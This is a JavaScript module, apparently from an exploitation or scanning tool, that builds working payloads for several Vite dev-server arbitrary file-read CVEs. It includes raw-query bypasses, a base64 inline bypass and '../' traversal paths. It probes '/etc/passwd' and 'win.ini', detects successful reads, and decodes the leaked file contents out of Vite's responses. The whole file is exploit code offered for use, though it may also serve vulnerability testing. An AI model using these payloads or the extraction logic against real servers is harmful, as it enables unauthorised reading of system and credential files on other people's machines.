'use strict';

/**
 * Payload templates and response detectors for the known Vite dev-server
 * arbitrary file-read vulnerabilities.
 *
 * Vite's dev server exposes a `/@fs/` endpoint (and, for files inside the
 * project root, direct path resolution) that transforms the requested file
 * into an ES module before returning it. A series of CVEs showed that query
 * strings such as `?import&raw??` and `?import&?inline=1.wasm?init` bypass the
 * server's `fs.deny` / path checks, letting an attacker read arbitrary files.
 *
 * Related advisories:
 *   - CVE-2023-30208 : `?raw??` bypass returning file contents.
 *   - CVE-2024-23331 : `/@fs/` path-traversal outside the allow list.
 *   - CVE-2025-30208 : `?import&raw??` bypass of the `?raw` restriction.
 *   - CVE-2025-31125 : `?import&?inline=1.wasm?init` base64 inline bypass.
 *   - CVE-2025-31486  : `.../?/../../` traversal segment bypass.
 *
 * This module only builds the request strings and knows how to recognise a
 * successful read in the response body. It performs no network I/O itself.
 */

const LINUX_PROBE = 'etc/passwd';
// Windows uses the `C://` double-slash form that the Vite resolver accepts.
const WINDOWS_PROBE = 'C://windows/win.ini';

/**
 * Each CVE definition describes:
 *   - id / aliases      : identifiers accepted from the UI / API.
 *   - label             : human friendly name.
 *   - separators        : path prefixes to try (empty prefix, then `/@fs`).
 *   - buildPath(path)   : turns a target file path into the exploit suffix.
 *   - detect(body)      : true when the body indicates a successful read.
 *   - extract(body)     : pulls the decoded file content out of the module
 *                         wrapper Vite returns, or null when parsing fails.
 */
const CVES = {
  'cve-2025-30208': {
    id: 'cve-2025-30208',
    aliases: ['cve-2023-30208', '30208'],
    label: 'CVE-2025-30208 (?import&raw?? raw bypass)',
    separators: ['', '/@fs'],
    buildPath(filePath) {
      return `/${trimLead(filePath)}?import&raw??`;
    },
    detect(body) {
      return typeof body === 'string' && body.includes('export default');
    },
    extract: extractRawModule,
  },

  'cve-2025-31125': {
    id: 'cve-2025-31125',
    aliases: ['31125'],
    label: 'CVE-2025-31125 (?inline=1.wasm base64 bypass)',
    separators: ['', '/@fs'],
    buildPath(filePath) {
      return `/${trimLead(filePath)}?import&?inline=1.wasm?init`;
    },
    detect(body) {
      return (
        typeof body === 'string' &&
        (body.includes('data:application/octet-stream;base64') ||
          body.includes('data:text/plain;base64'))
      );
    },
    extract: extractInlineBase64,
  },

  'cve-2025-31486': {
    id: 'cve-2025-31486',
    aliases: ['cve-2024-23331', '31486'],
    label: 'CVE-2025-31486 (traversal segment bypass)',
    separators: ['', '/@fs'],
    buildPath(filePath) {
      return `/x/x/x/vite-project/?/../../../../../${trimLead(filePath)}?import&raw??`;
    },
    detect(body) {
      return typeof body === 'string' && body.includes('export default');
    },
    extract: extractRawModule,
  },
};

// Build a lookup that resolves the canonical id from any accepted alias.
const ALIAS_INDEX = {};
for (const cve of Object.values(CVES)) {
  ALIAS_INDEX[cve.id] = cve.id;
  for (const alias of cve.aliases) {
    ALIAS_INDEX[alias.toLowerCase()] = cve.id;
  }
}

function trimLead(p) {
  return String(p).replace(/^\/+/, '');
}

/** Resolve a user supplied CVE identifier to its definition, or null. */
function resolveCve(idOrAlias) {
  if (!idOrAlias) return null;
  const key = String(idOrAlias).toLowerCase().trim();
  const canonical = ALIAS_INDEX[key];
  return canonical ? CVES[canonical] : null;
}

function listCves() {
  return Object.values(CVES).map((c) => ({
    id: c.id,
    label: c.label,
    aliases: c.aliases,
  }));
}

/** Probe path (relative) used to fingerprint the platform for a CVE. */
function probeFor(platform) {
  return platform === 'windows' ? WINDOWS_PROBE : LINUX_PROBE;
}

/**
 * Decode the `export default "..."` raw-module wrapper Vite emits for
 * `?raw` style reads. Returns the original file text, or null on failure.
 */
function extractRawModule(body) {
  if (typeof body !== 'string') return null;
  const beforeComment = body.split('//#')[0];
  const m = beforeComment.match(/export default\s*"([\s\S]*)"/);
  if (!m) return null;
  return m[1]
    .replace(/\\r\\n/g, '\r\n')
    .replace(/\\n/g, '\n')
    .replace(/\\t/g, '\t')
    .replace(/\\"/g, '"')
    .replace(/\\\\/g, '\\');
}

/**
 * Decode the base64 data-URI wrapper Vite emits for the `?inline=1.wasm`
 * style reads. Returns the decoded file text, or null on failure.
 */
function extractInlineBase64(body) {
  if (typeof body !== 'string') return null;
  const beforeComment = body.split('//#')[0];
  const m = beforeComment.match(
    /(?:data:application\/octet-stream;base64,|data:text\/plain;base64,)([A-Za-z0-9+/=\s]*)"\)/
  );
  if (!m) return null;
  try {
    return Buffer.from(m[1].trim(), 'base64').toString('utf8');
  } catch (_e) {
    return null;
  }
}

module.exports = {
  CVES,
  resolveCve,
  listCves,
  probeFor,
  LINUX_PROBE,
  WINDOWS_PROBE,
};
